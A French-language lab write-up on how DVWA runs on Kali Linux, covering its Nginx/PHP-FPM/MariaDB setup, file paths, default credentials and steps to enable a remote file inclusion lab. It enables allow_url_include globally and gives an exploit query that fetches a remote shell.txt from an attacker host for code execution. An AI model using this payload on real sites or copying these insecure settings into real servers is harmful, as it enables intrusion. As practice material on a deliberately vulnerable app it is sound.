# Write-up : Fonctionnement DVWA sur Kali Linux

DVWA (Damn Vulnerable Web Application) est packagé nativement sur Kali depuis 2022, avec scripts `dvwa-start`/`dvwa-stop` pour un démarrage one-click. Il utilise **Nginx + PHP-FPM isolé (port 42001)** pour éviter conflits Apache, idéal pour labs. [kali](https://www.kali.org/tools/dvwa/)

## Architecture technique

| Composant | Configuration | Rôle |
|-----------|---------------|------|
| **Nginx** | `/etc/dvwa/vhost/dvwa-nginx.conf` | Serveur web, root `/usr/share/dvwa/`, listen 42001 |
| **PHP-FPM** | `php8.4-fpm-42001.sock`, `/etc/php/8.4/fpm/php.ini` | `allow_url_include=On` pour RFI, pool dédié |
| **MariaDB** | User `dvwa` / `p@ssw0rd` | DB DVWA, créée via `/setup.php` |
| **Scripts** | `/usr/bin/dvwa-start` | `systemctl start nginx php8.4-fpm-42001 mariadb` + logs |

├── /usr/share/dvwa/                 # Root webapp (index.php, vulnerabilities/)  
│   ├── config/                      # config.inc.php (DB creds)  
│   ├── php.ini                      # OVERRIDE futile (FPM ignore)  
│   └── vulnerabilities/fi/          # RFI vuln 
├── /etc/dvwa/vhost/dvwa-nginx.conf  # Vhost 42001, allow all → RFI  
├── /etc/php/8.4/fpm/php.ini         # CRUCIAL : allow_url_include=On  
├── /etc/php/8.4/fpm/pool.d/         # dvwa.conf (php_admin_value)  
├── /var/run/php/php8-fpm-42001.sock # Socket FPM → Nginx fastcgi_pass  
├── /var/lib/mysql/                  # DB dvwa (user: dvwa/p@ssw0rd)  
└── /usr/bin/{dvwa-start,dvwa-stop}  # Scripts systemd wrappers  

```
dvwa-start → nginx@dvwa + php-fpm@42001 + mariadb → http://127.0.0.1:42001
```

| Fonction    | Avantage Kali DVWA                                              |
| ----------- | --------------------------------------------------------------- |
| Isolation   | Pool dédié ≠ Apache/Metasploit → zéro conflit ports |  
| Performance | Process workers dynamiques, pas Apache mod_php lent             |  
| Sécurité    | listen = /var/run/php/php8-fpm-42001.sock → localhost only      |  
| RFI lab     | allow_url_include=On pool-specific, reboot-proofphp             |  

## Installation & Lifecycle
```

sudo apt install dvwa  # 1.57 MB, deps: nginx php8.4-fpm mariadb
sudo dvwa-start        # Lance services
http://127.0.0.1:42001/setup.php → Create DB
Login: admin/password  # Niveau Low pour RFI
sudo dvwa-stop         # Nettoie tout
```

 locate dvwa.conf  
/var/lib/dpkg/info/dvwa.conffiles  
                                                                                                                                                    

┌──(kali㉿kali)-[~] 
└─$ more /var/lib/dpkg/info/dvwa.conffiles  
/etc/dvwa/config/config.inc.php.dist  
/etc/dvwa/nginx.conf  
/etc/dvwa/snippets/fastcgi-php.conf  
/etc/dvwa/vhost/dvwa-nginx.conf  
/etc/php/8.4/fpm/pool.d/42001.conf  


 php -i | grep allow_url_include  
allow_url_include => Off => Off  

## Personnalisation RFI 

1. **Edite vhost** : `sudo nano /etc/dvwa/vhost/dvwa-nginx.conf` → `allow all;`
2. **PHP** : `sudo nano /etc/php/8.4/fpm/php.ini` → `allow_url_include = On`
3. **Reload** : `sudo dvwa-stop && sudo dvwa-start`
4. **Exploit** : `?page=http://192.168.1.146:8000/shell.txt` → RCE via `$_GET`

**Logs debug** :  /var/log/dvwa/error.log et `/var/log/nginx/error.log` pour 4
## php.ini FPM global
sudo nano /etc/php/8.4/fpm/php.ini  
allow_url_include = On  
allow_url_fopen = On  

https://www.linkedin.com/in/bosjr
